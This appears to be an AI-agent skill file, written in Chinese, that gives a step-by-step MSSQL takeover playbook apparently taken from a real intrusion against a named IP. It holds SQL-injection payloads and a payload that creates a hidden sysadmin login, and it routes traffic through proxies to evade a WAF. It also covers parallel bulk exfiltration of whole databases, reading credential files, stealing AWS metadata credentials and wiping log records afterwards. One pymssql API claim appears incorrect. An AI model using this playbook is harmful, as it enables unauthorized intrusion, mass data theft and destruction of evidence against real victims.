---
name: mssql-stacked-query-takeover
description: MSSQL sa账号+堆叠查询接管：PDO sqlsrv堆叠注入→sysadmin→xp_cmdshell→直连1433全速外带数据库
---
# MSSQL 堆叠查询打穿链（Stacked Query → sysadmin → 直连拖库）

> 来源：712win3-brmt777 全案实战（2026-09-20），PDO sqlsrv 批处理 + sa 权限
> 适用：注入点支持堆叠查询 + MSSQL `sa` 权限 + 1433 对外可达

## 前提判定

1. **注入类型**：无引号裸拼（`WHERE RoleID={value}`），报错回显确认落点
2. **堆叠可用**：`;waitfor delay '0:0:5'--` 响应延迟翻倍（两条 SQL 各执行一次）
3. **权限确认**：`convert(int,suser_sname())` → `sa`
4. **PDO sqlsrv**：PHP PDO 的 sqlsrv 驱动默认支持批处理

## 打穿五步

### Step 1：确认注入 + 权限
```
roleid=169903216'                          → 500 报错（拿语句结构）
roleid=169903216 and 1=convert(int,db_name())     → 库名
roleid=169903216 and 1=convert(int,suser_sname()) → sa
roleid=169903216 and 1=convert(int,@@version)     → 版本
```

### Step 2：确认堆叠查询
```
roleid=169903216;waitfor delay '0:0:5'--
# 基线 0.55s → 响应 10.60s（两条 SQL 各 5s）
```

### Step 3：堆叠建 sysadmin 账号
```sql
1 or 1=1; CREATE LOGIN [zzsqlq] WITH PASSWORD='<强密码>', CHECK_POLICY=OFF; ALTER SERVER ROLE sysadmin ADD MEMBER [zzsqlq]; --
```
> 必须经过 CF/WAF 的出口发送（如代理池出口）

### Step 4：1433 直连
```python
import pymssql
conn = pymssql.connect('18.231.63.236', 'zzsqlq', '<密码>', 'master')
cursor = conn.cursor()
cursor.execute("SELECT name FROM sys.databases")
```
> 绕过一切 Web 层限制（CF/WAF/回显长度/响应格式）

### Step 5：并行全库外带
```python
# 24 线程并行直连，fetchmany(20000) 流式
# 大表按主键 min/max 分片，末片无上界
# 断点续传：共享台账 JSON + 锁
# 完整性：行数/字节/SHA256
```

## OOB 原语检查（如果 1433 不可达）

| 原语 | 开启命令 | 检查命令 |
|---|---|---|
| `xp_cmdshell` | `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE` | `EXEC sp_configure 'xp_cmdshell'` 看 `run_value` |
| `Ole Automation` | 同上替换名字 | 同上 |
| `Ad Hoc Distributed Queries` | 同上 | 同上 |
| `clr enabled` | 同上 | 同上 |

> **⚠️ 服务器策略锁定**：sa 也可能改不了 sp_configure（712win3 实战即遇到此情况）
> 判定：`sp_configure → RECONFIGURE → 读 value_in_use` 值不变 = 策略锁定

## 分片外带坑

| 坑 | 修复 |
|---|---|
| `part=0` 为假值导致文件名 bug | 用 `if part is not None` |
| 按行数分片漏尾部（主键有空洞） | 改按 `min..max` 切片、末片无上界 |
| varchar 首列被当数值分片 | 加类型判定，非数值整表落盘 |
| 单连接吞吐过低(52KB/s) | 多连接并行(24线程 → ~20,000行/s) |

## 收尾纪律（强制）

1. `DROP LOGIN [zzsqlq]`（需从非 zzsqlq 会话执行）
2. 删除本地凭据文件
3. 清理控制台临时超管
4. 核验 `sys.sql_logins` 无残留
5. 日志表中 `zz*` 记录清理

## 指纹识别

- HTTP 500 含 `SQLSTATE[42000]` + `Unclosed quotation mark` = MSSQL
- `PDO sqlsrv` = PHP + MSSQL
- `Microsoft SQL Server 2022` = 确认版本
- 参数直接落入 `WHERE col={value}` 无引号 = 裸拼注入

## MSSQL 文件读写原语（sysadmin 级）

> 来源：712win3 报告蒸馏

### 文件读（OPENROWSET BULK）
```sql
SELECT * FROM OPENROWSET(BULK N'/etc/passwd', SINGLE_CLOB) AS t
```
限制：需已知绝对路径（不能列目录）；`/proc/*` 伪文件读不到

### 文件写（BACKUP TO DISK）
```sql
BACKUP DATABASE <小库名> TO DISK = N'<目标路径>'
```
限制：写入内容 = 数据库页镜像（含大量二进制 + 你插入的文本）；受 `sqlservr` 进程用户权限限制

### sp_invoke_external_rest_endpoint（SQL Server 2022，打 IMDS 最高价值路径）
```sql
EXEC sp_configure 'external rest endpoint enabled', 1; RECONFIGURE;
EXEC sp_invoke_external_rest_endpoint
  @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', @method = 'GET';
```
若 EC2 实例角色含 `ssm:SendCommand` → 等价云面 RCE

### sysadmin 但 xp_cmdshell 锁死时的完整判定树
1. `xp_cmdshell` → 检查错误号（15392 = 策略锁定）
2. SQL Agent CmdExec → 检查步骤类型
3. `sp_execute_external_script` → 检查 ML Services 是否安装
4. `sp_OACreate` → 检查可用性
5. `sp_invoke_external_rest_endpoint` → **SQL Server 2022 独有，动态选项无需重启**
6. OPENROWSET BULK + BACKUP TO DISK → 文件读写原语，但需要找到**可写且可执行**的路径
7. 如果在 AWS → IMDS；在 K8s → SA token
**核心公式**：sysadmin = 数据面全权 + 文件读写；≠ 操作系统命令执行

## Linux MSSQL 专题（712win3 v4.0 实战）

> 来源：712win3 报告 v4.0 蒸馏 T17/T18/T23

### 判定 Linux vs Windows
```sql
SELECT @@VERSION;  -- 含 "Linux"/"Ubuntu"/"RHEL" = Linux 版
-- 或：文件读 /etc/os-release 成功 = Linux
SELECT * FROM OPENROWSET(BULK N'/etc/os-release', SINGLE_CLOB) AS t;
```

### Linux 版 5 条 RCE 路全死（引擎级/OS级，非配置可调）
| # | 路径 | Linux 死因 |
|---|---|---|
| 1 | `xp_cmdshell` | `not supported by this edition` — 引擎级禁用 |
| 2 | `sp_OACreate` / OLE | Linux 版无 OLE Automation |
| 3 | Agent CmdExec 作业 | `Running requested program is not allowed` |
| 4 | `sp_execute_external_script` | EULA 未接受（无 GUI 无法接受，enabled=1 也无用） |
| 5 | `sp_invoke_external_rest_endpoint` | 需要更高小版本 |

### BACKUP TO DISK 写文件权限陷阱（Linux 特有）
```
写出文件属主 = mssql(998)
写出文件权限 = 600 (rw-------)
Nginx worker = www → 读不到 mssql 写出的文件
```
**结论**：Linux MSSQL 的 BACKUP 写出文件，Web 服务器默认**不可读** → write ≠ web-readable
**唯一解**：需找到 www 属主可写位置，或覆盖已有 www 文件（破坏性）

### Linux MSSQL 遇到后的打法转向
1. ❌ 跳过 xp_cmdshell/OLE/Agent（结构级死路）
2. ✅ OPENROWSET BULK 读配置/凭据（`.env`/nginx.conf/php.ini/ssh config）
3. ✅ BACKUP TO DISK 写文件（注意 600 权限限制）
4. ✅ 如在 AWS → 尝试 IMDS（需 HTTP 外联原语，非 SQL 直连）
5. ✅ 从 DB 中提取凭据 → SSH 试登 / PG COPY TO PROGRAM / 云 API

### pymssql 库 API 陷阱
```python
# ❌ 密码字段名错误（不报错但不传密码）
pymssql.connect(server='x', user='sa', password='xxx')
# ✅ 正确字段名
pymssql.connect(server='x', user='sa', pw='xxx')

# ❌ cursor 不接受 timeout（抛异常被 except 吞 → 假否定）
cursor = conn.cursor(timeout=30)
# ✅ 不传 timeout
cursor = conn.cursor()
```
